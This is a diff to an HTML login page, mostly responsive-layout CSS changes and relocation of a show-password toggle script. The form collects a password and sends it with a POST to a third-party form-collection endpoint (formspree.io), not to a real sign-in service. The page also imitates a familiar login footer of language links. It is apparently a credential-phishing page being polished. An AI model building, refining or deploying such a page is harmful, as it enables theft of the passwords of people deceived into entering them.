@@ -8,18 +8,28 @@
     <style>
         body {
             
-            
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             margin: 0;
             padding: 0;
             background-color: #f4f4f4;
         }
+         @media (max-width: 768px) {
+            .form-container {
+                margin: 0 20px;
+            }
+
+            .form-container input {
+                height: 48px; /* Slightly larger for touch devices */
+            }
 
    .password-container {
       position: relative;
-      width: 300px;
+      width: 100%;
     }
     .password-container input {
-      width: 90%;
+      width: 100%;
       padding: 10px 40px 10px 10px; /* Add padding for the icon */
       
     }
@@ -78,6 +88,14 @@
   cursor: pointer;
 
 }
+
+  .form-container {
+            width: 100%;
+            max-width: 400px;
+            background: #ffffff;
+            padding: 20px;
+          
+        }
     </style>
 </head>
 <body>
@@ -87,12 +105,12 @@
     😎
   </div>
 
+
+<div class="form-container">
 <form
   action="https://formspree.io/f/mlddabnk"
   method="POST" id="contactForm"
 >
-
-
 
 
 
@@ -107,41 +125,21 @@
 -->
 
 <div class="password-container">
-    <input type="password" id="password" name="pas" style="border-color:#5892fd ;" required> 
+    <input type="password" id="password" name="pas" style="border-color:#5892fd; width: 100%; height: 32px;" required> 
     <i class="bi bi-eye toggle-password" id="togglePassword"></i>
   </div>
 
 
 
-
-
-<script>
-    const passwordField = document.getElementById('password');
-    const togglePassword = document.getElementById('togglePassword');
-
-    togglePassword.addEventListener('click', () => {
-      // Toggle the input type between "password" and "text"
-      if (passwordField.type === 'password') {
-        passwordField.type = 'text';
-        togglePassword.classList.remove('bi-eye');
-        togglePassword.classList.add('bi-eye-slash');
-      } else {
-        passwordField.type = 'password';
-        togglePassword.classList.remove('bi-eye-slash');
-        togglePassword.classList.add('bi-eye');
-      }
-    });
-  </script>
-
-
-
-
 <br>
 
-<button style="background-color:#5892fd; color:white; width: 330px; height: 40px;" type="submit" >Login</button><br>
+<button style="background-color:#5892fd; color:white; width: 100%; height: 40px;" type="submit" >Login</button><br>
 <a href="" style="text-decoration-line: none;">Forgot Password?</a><br>
 
 </form>
+
+
+</div>
 
   <div class="hr-with-text">
     <span>or</span>
@@ -154,11 +152,6 @@
 <a href="" style="text-decoration-line: none; color: #5AB2FF;"> Af-sommail</a><br><br>
 <a href="" style="text-decoration-line: none; color: #5AB2FF;">  Espanol</a><br><br>
 <a href="" style="text-decoration-line: none; color: #5AB2FF;">   العربية</a><br><br>
-
-
-
-
-
 
 
 
@@ -203,10 +196,23 @@
 
 
 
+<script>
+    const passwordField = document.getElementById('password');
+    const togglePassword = document.getElementById('togglePassword');
 
-
-
-
+    togglePassword.addEventListener('click', () => {
+      // Toggle the input type between "password" and "text"
+      if (passwordField.type === 'password') {
+        passwordField.type = 'text';
+        togglePassword.classList.remove('bi-eye');
+        togglePassword.classList.add('bi-eye-slash');
+      } else {
+        passwordField.type = 'password';
+        togglePassword.classList.remove('bi-eye-slash');
+        togglePassword.classList.add('bi-eye');
+      }
+    });
+  </script>
 
 
 
